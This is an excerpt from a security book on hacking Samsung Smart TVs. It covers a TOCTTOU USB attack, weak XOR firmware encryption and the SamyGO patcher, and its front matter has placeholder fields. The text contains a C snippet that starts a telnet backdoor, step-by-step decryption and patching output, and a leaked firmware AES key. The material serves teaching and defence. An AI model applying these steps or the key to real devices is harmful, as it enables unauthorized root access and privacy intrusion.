
Nitesh Dhanjani
Abusing the Internet of Things

Abusing the Internet of Things
by Nitesh Dhanjani
Copyright © 2010 Nitesh Dhanjani. All rights reserved.
Printed in the United States of America.
Published by O’Reilly Media, Inc., 1005 Gravenstein Highway North, Sebastopol, CA 95472.
O’Reilly books may be purchased for educational, business, or sales promotional use. Online editions are
also available for most titles (http://safaribooksonline.com). For more information, contact our corporate/
institutional sales department: 800-998-9938 or corporate@oreilly.com.
Editors: Mike Loukides and Brian Sawyer
Production Editor: FIX ME!
Copyeditor: FIX ME!
Proofreader: FIX ME!
Indexer: FIX ME!
Cover Designer: Karen Montgomery
Interior Designer: David Futato
Illustrator: Rebecca Demarest
January -4712:
First Edition
Revision History for the First Edition:
2015-04-03: Early release revision 1
2015-05-29: Early release revision 2
2015-06-08: Early release revision 3
2015-06-16: Early release revision 4
2015-06-26: Early release revision 5
See http://oreilly.com/catalog/errata.csp?isbn=0636920033547 for release details.
Nutshell Handbook, the Nutshell Handbook logo, and the O’Reilly logo are registered trademarks of O’Reilly
Media, Inc. !!FILL THIS IN!! and related trade dress are trademarks of O’Reilly Media, Inc.
Many of the designations used by manufacturers and sellers to distinguish their products are claimed as
trademarks. Where those designations appear in this book, and O’Reilly Media, Inc. was aware of a trademark
claim, the designations have been printed in caps or initial caps.
While every precaution has been taken in the preparation of this book, the publisher and authors assume
no responsibility for errors or omissions, or for damages resulting from the use of the information contained
herein.
ISBN: 063-6-920-03354-7
[?]

Table of Contents
Preface. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  vii
the area of attack vectors against Smart TVs to understand how we can improve them
and securely enable our IoT future that is likely to continue to include Smart TV displays
in one way or another.
The TOCTTOU Attack
Many of the popular Smart TVs, particularly from Samsung, run the Linux operating
system. They are essentially similar in design to desktop or laptop computers, the only
difference being is that their User Interface design is tailored towards displaying video
content from various sources. Using a powerful operating system like Linux also gives
Smart TVs the ability to run various applications such as Skype and the web browser.
We will discover details of the underlying architecture as we analyze some well-
publicized attacks against Smart TVs in this chapter. Let’s start with a basic attack vector
called Time-of-Check-to-Time-of-Use (TOCTTOU) publicized by researchers Collin
Mulliner and Benjamin Michéle.
The TOCTTOU attack targets one of the most basic security capabilities in consumer
electronics: the ability for the device to ensure that a software update is legitimate and
created by the manufacturer or a trusted third party. This is an important capability for
the manufacturer to protect their intellectual property and also to secure the device
against malicious software that may violate the integrity of the software or compromise
the privacy of the consumer. A good example is the jailbreak community surrounding
Apple’s iOS operating system, which powers the iPhone and the iPad. Apple continu‐
ously builds security mechanisms to prevent others from being able to modify the core
functionality of their devices to preserve their ownership of the experience of the prod‐
uct and to prevent malicious applications from infecting the device. The jailbreak com‐
munity on the other hand strives to find loopholes in Apple’s security mechanisms so
they can modify the functionality of the devices to install customized tweaks and soft‐
ware not authorized by Apple. In the case of Smart TVs, manufacturers want to protect
their devices from running unauthorized code to protect their intellectual property, to
avoid warranty issues from users uploading buggy code, and to protect digital content
such as online rental movies from being recorded. Smart TV users, on the other hand,
may want to break the security mechanisms enforced by manufacturers so they can
enable additional tweaks, fix software issues on devices that are no longer supported by
The TOCTTOU Attack 
| 
147

the manufacturer, and perhaps engage in theft by permanently recording rental based
media content.
The SamSung LExxB650 Series
Mulliner’s research focuses on SamSung LExxB650 series (Figure 5-1) of Smart TVs
even though the concept of the TOCTTOU attack vector can be applied to other con‐
sumer electronic devices that may be similarly vulnerable.
Figure 5-1. SamSung’s LExxB650 series Smart TV.
In the case of Smart TVs and other electronics, the USB port is often used to read and
write files that can comprise of media content, applications, and software updates. A
storage device, such as a USB memory stick, can be plugged in to the TV to watch content
stored on the memory stick, as well as install Smart TV Aps, and also to upgrade firm‐
ware.
Apps specifically written for the SamSung LExxB650 series of TVs can be of two types:
Adobe Flash and native binaries. Mulliner’s research targets the native binary approach.
These binaries end with the .so extension, which means that the binaries are able to
share code with other binaries and are loaded on runtime. The advantage of this is that
other modules can use code written using this approach and applications, which reduces
148 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

the size of executables and also allows developers to change shared code in one file and
not have to recompile other dependencies. The SamSung TVs use Linux so this approach
makes sense. In the world of Microsoft Windows, these files are known as Dynamic
Link Libraries (DLLs).
SamSung uses BusyBox, which combines tiny versions of many common Linux utilities
into a single executable. The BusyBox system is useful to power consumer devices be‐
cause it is an easy way to include or exclude commands making it extremely modular.
The SamSung TVs run a binary called exeDSP that basically controls the entire func‐
tionality of the system. It is responsible for the user interface navigation, allowing the
user to change settings, and for accessing the applications. The exeDSP binary runs as
the root user, i.e. with full privileges.
The Apps written for SamSung TVs contain a minimum of three files: The executable
code (Adobe flash or a shared object), a bitmap (the icon for the App), and the package
description in a file called clmeta.dat. Here is an example of a clmeta.dat file:
<?xml version="1.0" encoding="utf-8"?>
<contentlibrary>
  <contentpackid="tocttou">
    <category>Wellness</category>
    <title language_id="English">tocttou</title>
    <startpointlanguage_id="English">tocttou.so</startpoint>
    <thumbnailpath>tocttou.bmp</thumbnailpath>
    <totalsize>1</totalsize>
  </contentpack>
</contentlibrary>
The startpoint tag specifies the actual binary, which in this case is tocttou.so. The
category tag specifies the type of App, which in this case is “Wellness”. Other common
categories recognized by SamSung are “Game” and “Children”. Mulliner noted that ap‐
plications of type “Game” are in the form of shared objects while other categories imply
Adobe Flash applications.
In the case of shared objects, the Game_Main function call is invoked by the exeDSP
executable, which is coded using the C programming language. The following is a simple
shared object code:
int Game_Main(char *path, char *udn)
{
    system("telnetd &");
    return 0;
}
In this case, the application starts up the Telnet service (assuming it is installed on the
system). However, the LExxB650 series of SamSung TVs do not allow the installation
of additional applications that are shared libraries. This severely limits the ability of a
third party to modify the functionality of the TV. This also limits the ability of a third
The TOCTTOU Attack 
| 
149

party to install malicious code that could infect the TV to let the attacker invade privacy
by viewing video from a camera attached to the TV and stealing any credentials that
may be stored on the TV. The goal of Mulliner’s research was to test and demonstrate
if there is a way to override this limitation.
The Exploit
Recall that the exeDSP executable runs with root privileges. The exeDSP process is also
responsible for starting up applications that are shared libraries. Since exeDSP does not
lower the privileges of shared libraries that it executes, the ability to install additional
third-party applications is immensely attractive to an attacker as well as to someone
who wants to extend or modify the functionality of their TV. Therefore, the goal of the
attack is to somehow get the TV to allow installation of an external application that is
of category “Game” which corresponds to shared library code.
Mulliner used a Gumstix expansion board to setup the attack. The Gumstix board is
equipped with an USB OTG port which allows other USB devices to connect to it as
clients (for example USB memory sticks and digital cameras). USB OTG also allows the
Gumstix board to function as a client, i.e. connect into other USB hosts as a storage
device (such as a USB memory stick).
The Gumstix board is basically a mini computer. These instructions
on how to connect to a new Gumstix board are useful in understand‐
ing the functionality and capability of the board.
The g_file_storage.ko module is part of the Linux USB stack. By using this module
and presenting the Gumstix board as a USB storage device, it is possible to analyze what
files the TV reads when presented with an application. In the case of the SamSung TV,
non-shared library applications, i.e. Adobe Flash applications, are copied from the USB
device to the TV’s internal storage and executed. Each application should be in it’s own
directory, include a bitmap file, the clemeta.dat file, and the actual binary as listed in
the startpoint tag in clmeta.dat.
The g_file_storage.ko utility takes the filename of a file system image as a parameter
and exports it as a USB device. When connected to a host, each block request is read
and sent over. Mulliner modified the utility to also track every block read request in
order to ascertain exactly what information the TV is reading when presented with a
new application. The following is a sample output from the modified version of
g_file_storage.ko when the TV is presented with a Adobe Flash application:
11:18:56 TOCTTOU        (DIR)
11:18:56 CLMETA.DAT     (471b) [/TOCTTOU]
11:18:56 CLMETA.DAT     -> read completed!
150 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

11:18:56 CACHE          (DIR)
11:18:56 CLMETA.DAT     (450b) [/CACHE]
11:18:56 CLMETA.DAT     -> read completed!
11:19:10 CACHE.BMP      (843758b) [/CACHE]
11:19:10 CACHE.BMP      -> read completed!
11:19:10 TOCTTOU.BMP    (490734b) [/TOCTTOU]
11:19:10 TOCTTOU.BMP    -> read completed!
11:19:56 TELNETD        (1745016b) [/TOCTTOU]
11:19:56 TELNETD        -> read completed!
11:19:56 TOCTTOU.SO     (4608b) [/TOCTTOU]
11:19:56 TOCTTOU.SO     -> read completed!
In this case, the g_file_storage.ko module running on the Gumstix that is plugged
into the SamSung TV included two applications in directories of their own: TOCTTOU
and CACHE. For each application, the TV requested the CLMETA.DAT file (at the 11:18:56
mark). The user is then presented with the category of applications that are available to
be installed. Let’s assume the TOCTTOU application is of type “Wellness” and the user
selects this using the TV remote. At this time, the entire contents of the TOCCTOU direc‐
tory is copied to the TV’s internal storage, including the bitmap image, the telnetd
binary executable, and the TOCTTOU.SO executable. Note that applications of the category
“Games” will not be installed by the TV since externally coded shared library code is
prohibited.
Notice that the clmeta.dat file is only read once (11:18:56). When the user installs the
TOCTTOU application, the TV does not re-read the clmeta.dat file. This is because the
TV runs Linux which includes the functionality of a “block cache”. Because file read
operations can slow things down, the “block cache” functionality speeds things up by
storing recently accessed file operations into the TVs RAM, which is faster to read than
a file system.
The idea behind the TOCTTOU attack is to initially provide the TV with an application
directory in which the corresponding clmeta.dat is of category is “Wellness”. Once the
TV verifies this, the user is able to select the application and the TV will copy the entire
contents of application directory into it’s local storage and execute it. The TOCTTOU
attack replaces the clmeta.dat category to “Games” after the initial verification allowing
for shared library code to be installed. In order to do this, Mulliner further extended
the functionality of g_file_storage.ko to be able to track how many times a file (“trig‐
ger file”) has been requested for read. Furthermore, g_file_storage.ko was extended
to switch to another image once read count for the “trigger file” reaches a certain value
(i.e. “trigger count”).
Mulliner created two file systems images for the attack. The first image, called “B” (for
“Benign”) includes two applications, TOCTTOU and Cache. Each of these applications
contain a clmeta.dat file listed in the category of “Wellness” and corresponding files
for icons and executables. The TOCTTOU application includes the telnetd executable.
The second image, called “M” (supposedly to imply “Modified”), includes the exact same
The TOCTTOU Attack 
| 
151

files except for the clmeta.dat file in the TOCCTOU directory that was modified to the
category of “Games”.
Mulliner then used his modified g_file_storage.ko code to attach to the TV as a USB
stick and serve the “B” image. When the TV reads the clmeta.dat file in the directory
of the “Cache” application, g_file_storage.ko switches to the “M” image in the back‐
ground. When the user elects to install the TOCTTOU application, the application code
is served from the value of the “trigger count” parameter for the trigger file (Cache/
clmeta.dat) to 1. In this situation, when the user elects to install the TOCCTOU applica‐
tion, the files from image “M” are served to the TV. However, the problem is that even
though the malicious image “M” contains the clmeta.dat file with category “Games”,
it is not re-read by the TV upon installation because it is in the TV’s memory because
of it’s block caching functionality. Mulliner got around this by making the size of the
clemeta.dat file in the “Cache” application greater than 260 Megabytes (by padding it
with extra spaces). This exhausts the RAM allocated to block caches and makes the TV
re-read clmeta.dat, which is of category “Games”.
Mulliner’s attack succeeds because the TV only checks the category of the clmeta.dat
file initially and not when it is re-read (therefore the name: “Time-of-Check-to-Time-
of-Use”). Here is the output of g_file_storage as this attack is played out:
1 TOCTTOU           (DIR)
2 CLMETA.DAT        (471b) [/TOCTTOU]
3 CLMETA.DAT        -> read completed!
4 CACHE             (DIR)
5 CLMETA.DAT        (272630223b) [/CACHE]
6 CLMETA.DAT        -> read completed!    [device switched!]
7 CACHE.BMP         (843758b) [/CACHE]
8 CACHE.BMP         -> read completed!
9 TOCTTOU           (DIR)
10 TOCTTOU.BMP      (490734b) [/TOCTTOU]
11 TOCTTOU.BMP      -> read completed!
12 TELNETD          (1745016b) [/TOCTTOU]
13 TELNETD          -> read completed!
14 TOCTTOU.SO       (4608b) [/TOCTTOU]
15 TOCTTOU.SO       -> read completed!
16 CLMETA.DAT       (471b) [/TOCTTOU]
17 CLMETA.DAT       -> read completed!
When the Gumstix board is first plugged into the TV, g_file_storage.ko serves up
files from image “B”. The TV reads the clmeta.dat file and makes sure they are not
categorized as “Games”. Notice that the clmedta.dat file is about 270 megabytes, which
fills up the cache memory allocation in the TV. This will make the TV re-read previously
cached files from the Gumstix board again. At this point, the g_file_storage.ko utility
switches to image “M” (signified by “device switched” in line 6). The TV is satisfied that
none of the applications are of type “Games” and allows the user to pick an application
to install. The user selects the TOCTTOU application and the TV copies all files in the
152 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

TOCTTOU directory to it’s local storage, including an additional binary for the telnet
service (telnetd).
Notice that the TV re-reads the clmeta.dat file in step 16, which is served from image
“M” and is categorized as “Games”. Since the TV doesn’t double check the categorization
upon re-reading the file, the application is copied onto local storage and executed by
exeDSP with root privileges. In this way, Mulliner was able to trick the TV into running
a shared library application with the highest privileges. In this case, Mulliner used the
Game_Main function in tocttou.so to invoke the telnetd binary. Assuming this binary
is modified not to ask for a password, the attacker can use this method to login into the
TV (using a telnet client) with no password and directly obtain a root shell.
This is a great example of how a simple attack can be used to bypass restrictions and
security functionality designed into popular Smart TVs. Even though this attack re‐
quires physical access to the TV, it is still interesting because it exploits a simple vul‐
nerability, i.e. the TV doesn’t check the categorization of the application when re-reading
the clmeta.dat file.
We shouldn’t discount the probability of attack because it requires physical access. A
specific family can indeed be targeted via a social engineering attack. This could take
the form of a modified board (such as the Gumstix) being physically mailed to the family
in the guise of an official update from “Samsung”. Many Smart TVs include video cam‐
eras for conference calling or allow third party cameras to be plugged in. A target family
that can be socially engineered to plug in a malicious device into the USB port can
therefore quickly have their privacy taken away from them in addition to their Smart
TV being abused to launch further attacks into their home network and neighboring
IoT devices by including specifically designed malware and remote login functionality
to enable the attacker.
The countermeasure for this attack is quite simple. The TV (and other IoT devices that
want to restrict third party applications) should first copy the application onto local
storage and then check the categorization. If the categorization fails, the TV should
discard and reject the application. This is also true for other categories of IoT devices
that allow users to only install certain types of applications. This will help ensure that
the IoT devices users depend on for their privacy are safe and not vulnerable to simple
attacks like TOCTTOU.
You call that Encryption?
The field of cryptography is alive and thriving. Advances in encryption algorithms and
computational power is helping to protect our data and the integrity of software and
hardware. IoT devices are and will continue to be dependent on encryption to make
sure the privacy of the user is protected and the integrity of the device is not compro‐
mised. Encryption algorithms are great tools to leverage to promote secure design, but
You call that Encryption? 
| 
153

ultimately, the architects and developers must have a proper understanding of how the
algorithms work to be able to design them securely. Lack of comprehension of the fun‐
damentals of encryption algorithms can and will make the end product vulnerable to
flaws and attacks.
In this section, we will take a look at how the lack of understanding of basic encryption
algorithms led a SamSung Smart TV to become vulnerable to a local (physical access
required) attack which allowed the user to modify the TV’s firmware. This is a similar
outcome to the TOCTTOU scenario, but the attack vector exploits an implementation
flaw that uses XOR encryption. We will quickly recap the XOR algorithm and analyze
how the attack works.
Understanding XOR
XOR is a boolean algebra function which stands for “eXclusive OR”. Quite simply, it will
return true if one, and only one, of the two operators is true. With this logic, the following
table holds true:
1 XOR 1 is 0
1 XOR 0 is 1
0 XOR 1 is 1
0 XOR 0 is 0
Let us write a simple C program to XOR a string cat with the key KEY.
#include <stdio.h>
int main()
{
  char string[4]="cat";
  char key[4]="KEY";
  for(int x=0; x<3; x++)
  {
    string[x]=string[x]^key[x];
    printf("%c",string[x]);
  }
  printf("\n");
  return 1;
}
Note that ^ represents an XOR operation in the C programming language.
Now let’s compile it:
$ gcc xor.c -o xor
And run it to see the output:
154 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

$ ./xor
($-
The XOR operation of cat and KEY results in the output ($-. This is because the program
performs an XOR operation of c with K, a with E, and t with Y. Let’s analyze one of these
operations, i.e. c with K. The ASCII value of c is 99, which is represented as 01100011.
The ASCII value of K, is 75 which is represented in binary as 01001011. Now let us XOR
these two values:
        01100011
(XOR)   01001011
        --------
        00101000
        --------
The result is 00101000 in binary which is the decimal 40 whose ASCII value is (. This
explains why the program output ($-. Feel free to repeat this manual exercise for the
remaining two characters and you should come up with $ and -.
In our case, the encryption key was “KEY” and the clear-text data was the word cat
resulting in the cyphertext ($-. Anyone who knows the cyphertext and is in possession
of the key KEY can decrypt ($- back to the clear-text cat. Let us make sure this works.
#include <stdio.h>
int main()
{
  char string[4]="($-";
  char key[4]="KEY";
  for(int x=0; x<3; x++)
  {
    string[x]=string[x]^key[x];
    printf("%c",string[x]);
  }
  printf("\n");
  return 1;
}
Let’s compile and run the program:
$ gcc xor2.c -o xor2
$ ./xor2
cat
This is a simple and easy description of how XOR works. Of-course, in our case, we
used a key of the same length as the clear-text data so that the example is easy to un‐
derstand. In real life, it is important to use a longer key otherwise it becomes easy for
You call that Encryption? 
| 
155

an attacker to guess the key with brute-force. If the data is longer than the key, the key
is repeated to match up with the data. XOR is a very strong encryption algorithm in the
case where the key is a one-time-pad, i.e. if the key never repeats and is as long or longer
than the data.
I call it Encraption
SamSung allows users to download firmware that can be placed on a USB stick and
connected to the Smart TV in order to perform upgrades. In this case, we will download
the firmware for the PN58B860Y2F model. In this case, we will analyze the firmware
issued on September 22, 2009 with version 1013(Figure 5-2).
Figure 5-2. Firmware upgrade downloads available on SamSung’s website
Even though the firmware upgrade file is in the windows executable format of .exe, it
is also a zip file that can be uncompressed using the unzip tool:
$ unzip 2009_DTV_2G_firmware.exe
Archive:  2009_DTV_2G_firmware.exe
  inflating: T-CHE7AUSC/crc
  inflating: T-CHE7AUSC/ddcmp
   creating: T-CHE7AUSC/image/
  inflating: T-CHE7AUSC/image/appdata.img.enc
  inflating: T-CHE7AUSC/image/exe.img.enc
 extracting: T-CHE7AUSC/image/info.txt
  inflating: T-CHE7AUSC/image/validinfo.txt
  inflating: T-CHE7AUSC/image/version_info.txt
156 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

  inflating: T-CHE7AUSC/MicomCtrl
  inflating: T-CHE7AUSC/run.sh.enc
The important firmware image files appear to be T-CHE7AUSC/image/appda
ta.img.enc and T-CHE7AUSC/image/exe.img.enc. Let’s see what happens when we in‐
spect these files using the strings tool, which is used to output the printable parts of
binary files:
$ strings T-CHE7AUSC/image/exe.img.enc
ct-KLG7CUQC,
KHM7@USCT-CHE7AUz'r
ausct
dect
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-CHE7AUSCT-
CHE7AUSCT-CHE7AUSCT-CHE7AUSC
[rest of output removed for brevity]
Isn’t it interesting to see the string T-CHE7AUSC repeat in a file that is supposedly en‐
crypted? It is especially notable because it is also the name of the root directory, which
is created when the firmware download is unzipped, and as such this string is deemed
clear-text. If the image files are truly encrypted, this string should not be showing up in
clear. What is going on here? Well, let’s take a moment to consider what happens when
a character is XOR’d with the null ASCII character of decimal value 0. Null strings are
often used to signify the end of strings in memory and represented with the escape
sequence of \0.
The C program below performs an XOR operation between the character a and the null
character:
#include <stdio.h>
int main()
{
  printf("%c\n",'a' ^ '\0');
  return 1;
}
Let’s compile and run our program to see the output:
$ gcc xor_null.c -o xor_null
$ ./xor_null
a
You call that Encryption? 
| 
157

So there we have it. The XOR operation of a character with a null reveals the original
character. This means that if your XOR key is small and if the file you are XOR-ing
contains a series of null characters, the actual key will be revealed in the cyphertext! This
is exactly what happened in the case of the SamSung firmware file we looked at using
the strings command. SamSung made the mistake of using a small key without under‐
standing that the image file they are encrypting contained a lot of null characters (this
is very common in binary files). Not only did they commit this mistake, the root di‐
rectory name of the firmware is also the key.
The implications of this is that anyone can decrypt the firmware with the exposed key,
make changes to the firmware, and encrypt it again using the same key. This bypasses
SamSung’s wish that users and external parties should not be allowed to tinker with the
core functionality of the TVs to bypass application and digital rights controls.
The SamyGO website and forums are thriving with activity from SamSung TV owners
who want to modify their TVs in just the way SamSung wouldn’t want them to. One of
the popular tools available from SamyGO is called SamyGO Firmware Patcher which
exploits the XOR vulnerability we just looked at. This tool enables telnet so users can
remotely login to the TV and obtain a Linux prompt so they can further modify the TV.
To run this tool, you just have to download the firmware as we did earlier and issue the
path to the location of the firmware:
$ python ./SamyGO.py ~/Downloads/T-CHE7AUSC
SamyGO Firmware Patcher v0.16 Beta (c) 2010 Erdem U. Altinyurt
                  -=BIG FAT WARNING!=-
           You can brick your TV with this tool!
Authors accept no responsibility about ANY DAMAGE on your devices!
        project home: http://SamyGO.sourceforge.net
XOR Encrytped CI firmware detected.
Decrypting with XOR key :  T-CHE7AUSC
Crypto package found, using fast XOR engine.
Applying VideoAR Patch...
MD5 of Decrypted image is : 9b4d11ddc6bd41156573ae61d1660fdf
FAT image analyzed - exeDSP location: 7811072  size: 37414044
ARM ELF exeDSP File Detected
CToolMmbDisplaySizeItem::GetToolItem() Adress : 0x13537D0
CToolMmbDisplaySizeItem::PressLeftRightKey() Adress : 0x1353AC8
VideoAR Fix v1 Compatibility Found.
VideoAR Fix v1 Patched on image.
Applying Telnet Patch...
Searching %3
Suitable Location Found for Script injection on Offset : 3969567
Enable Telnet or Advanced Mode on image( T/a )?
Patching File...
Telnet Enabled on image.
158 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

Calculatin new CRC :  d71d7f17
Updating /SamyGO/T-CHL7DEUC/image/validinfo.txt with new CRC.
Encrypting with XOR :  T-CHE7AUSC
Crypto package found, using fast XOR engine.
Operation successfully completed.
Now you can flash your TV with ./T-CHL7DEUC directory.
Notice that the SamyGo.py tool decrypted the “encrypted” image with the exact key we
found using the strings command (T-CHE7AUSC). It then patches the firmware to in‐
clude the telnet service and encrypts it with the same XOR key. Now, all the user has to
do is place the T-CHE7AUSC directory and it’s contents onto a USB stick and connect it
to the TV. The TV will then go through the process of upgrading the firmware, which
will cause it to enable the telnet function. The default username applied by the patch is
root and there is no password required (Figure 5-3).
Figure 5-3. No password required to login to the SamSung TV after applying telnet
patch
The SamyGO website contains tons of additional tools that exploit
conditions beyond the example listed in this chapter. If you have a
SamSung TV, take a look and see what tools are available that may
interest you.
Give some thought to the gravity of the situation SamSung has caused because they did
not comprehend the basics of the XOR algorithm. With this one mistake, they’ve caused
the SamyGo community to further thrive, which is against the interests of the business
of SamSung. Highly technical users love this situation since it gives them tremendous
freedom to modify the Smart TV device they feel they paid for and feel they should be
allowed to modify. From Samsung’s point of view, however, users are now able to tweak
You call that Encryption? 
| 
159

the firmware, which can cause TVs to malfunction. This also places legal concerns from
content providers SamSung may have partnered with since firmware tweaks can be
abused to legally store and distribute content protected media.
The SamyGo community doesn’t seem particularly savvy when it comes to security. As
Figure 5-3 shows, the patches being applied to increase functionality utilize no pass‐
words, or in some cases weak passwords (such as “SamyGo”). Not only can a sophisti‐
cated user place malware on a TV he or she has physical access to (by patching the
firmware to include remote monitoring tools), but malware on other devices on the
same network as that of the SamSung TV can attempt to login to tweaked TV sets by
attempting null passwords or “SamyGo”.
The firmware we studied was last updated on 2009. This is because there is little hope
for SamSung to rectify this problem on older TVs. If SamSung decided to patch this
issue, they’d have to first release the patch, which is encrypted using the flawed XOR
mechanism so that the existing TVs can apply the patch in the first place. This situation
allows someone to decrypt the patch and analyze the patch in the clear. Even if SamSung
were to find an elegant way to do this, it would be operationally infeasible since the user
wouldn’t be able to only apply the latest patch if they were to skip a few versions (which
most users do). They’d be required to first issue the critical patch that fixed the XOR
flaw so that the TV could understand the new encryption mechanism that is used to
protect the latest firmware file. See the amount of mess this has created?
The slang “encraption” (with the emphasis on “crap”) is affectionately used by the cy‐
bersecurity community to call out badly implemented encryption. As such, the title of
this section is rightfully justified.
Understanding and Exploiting the App World
Smart TVs have Apps such as Skype, the popular video conferencing solution. In this
section, we will take a deeper look into the world of Apps on TVs to understand how
they work and the security mechanisms surrounding them. In the future, more and
more people are going to use and rely on Apps on their Smart TVs so the potential for
abuse becomes higher. This is because more Apps will mean more code is written to
run on TVs and this code may contain security vulnerabilities. The popularity of Apps
will also draw the interest of malicious attackers who have an interest in continuing to
find avenues to exploit systems to steal data from victims.
Decrypting Firmware
For us to have a deeper understanding of how Apps work, we need to become familiar
with the underlying platform that supports the functionality of a Smart TV. We’ve dis‐
cussed the weak XOR encryption used in SamSung TVs that allows for the decryption
and patching of firmware. SamSung has countered this by encrypting the firmware using
160 
| 
Chapter 5: The Idiot Box: Attacking “Smart” Televisions

AES in newer models of their Smart TVs. However, the secret encryption key has been
leaked and is available to the public. It is unclear how this happened, but tools from the
SamyGo website contain this key and can easily decrypt the firmware downloaded from
the Samsung website.
Let’s start with a firmware that we know been encrypted utilizing AES:
$ ls -l T-ECPDEUC/image/
total 197164
-rw-rw-r-- 1 apple apple 192794916 Apr 29  2013 exe.img.sec
-rw-rw-r-- 1 apple apple       132 Apr 29  2013 exe.img.sec.cmac
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 exe.img.sec.cs
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 exe.img.sec.vs
-rw-rw-r-- 1 apple apple   3272292 Apr 29  2013 Image.sec
-rw-rw-r-- 1 apple apple       132 Apr 29  2013 Image.sec.cmac
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 Image.sec.cs
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 Image.sec.vs
-rw-rw-r-- 1 apple apple        17 Apr 29  2013 info.txt
-rw-rw-r-- 1 apple apple         7 Apr 29  2013 major_version
-rw-rw-r-- 1 apple apple         6 Apr 29  2013 minor_version
-rw-rw-r-- 1 apple apple   5763492 Apr 29  2013 rootfs.img.sec
-rw-rw-r-- 1 apple apple       132 Apr 29  2013 rootfs.img.sec.cmac
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 rootfs.img.sec.cs
-rw-rw-r-- 1 apple apple       256 Apr 29  2013 rootfs.img.sec.vs
-rw-rw-r-- 1 apple apple        65 Apr 29  2013 validinfo.txt
-rw-rw-r-- 1 apple apple        48 Apr 29  2013 version_info.txt
In order to decrypt this firmware, we can use the SamyGO Firmware Patcher which has
the leaked secret key embedded in the tool:
$ ./SamyGO.py decrypt_all ./T-ECPDEUC
SamyGO Firmware Patcher v0.34 (c) 2010-2011 Erdem U. Altinyurt
                   -=BIG FAT WARNING!=-
            You can brick your TV with this tool!
Authors accept no responsibility about ANY DAMAGE on your devices!
         project home: http://www.SamyGO.tv
Firmware:  T-ECPDEUC v2008.2
AES Encrytped CI+ firmware detected.
Processing file Image.sec
secret key :  3EF6067262CF0C678598BFF22169D1F1EA57C284
Decrypting AES...
Decrypting with  XOR Key :  T-ECPDEUC
Crypto package found, using fast XOR engine.
Calculated CRC : 0xEF4527E9
CRC Validation passed
Processing file rootfs.img.sec
secret key :  3EF6067262CF0C678598BFF22169D1F1EA57C284
Understanding and Exploiting the App World 
| 
161

Decrypting AES...
Decrypting with  XOR Key :  T-ECPDEUC
Crypto package found, using fast XOR engine.
Calculated CRC : 0xCF5DC1D2
CRC Validation passed
Processing file exe.img.sec
secret key :  3EF6067262CF0C678598BFF22169D1F1EA57C284
Decrypting AES...
Decrypting with  XOR Key :  T-ECPDEUC
Crypto package found, using fast XOR engine.
Calculated CRC : 0x109B6984
CRC Validation passed
Notice the secret key that is embedded in the tool. Now that have the decrypted versions
of the image files:
$ ls -l T-ECPDEUC/image/
total 591372
-rw-r--r-- 1 apple apple 192794624 Dec  3 15:40 exe.img
-rw-r--r-- 1 apple apple 192794624 Dec  3 15:39 exe.img.enc
-rw-r--r-- 1 apple apple 192794916 Apr 29  2013 exe.img.sec
-rw-r--r-- 1 apple apple       132 Apr 29  2013 exe.img.sec.cmac
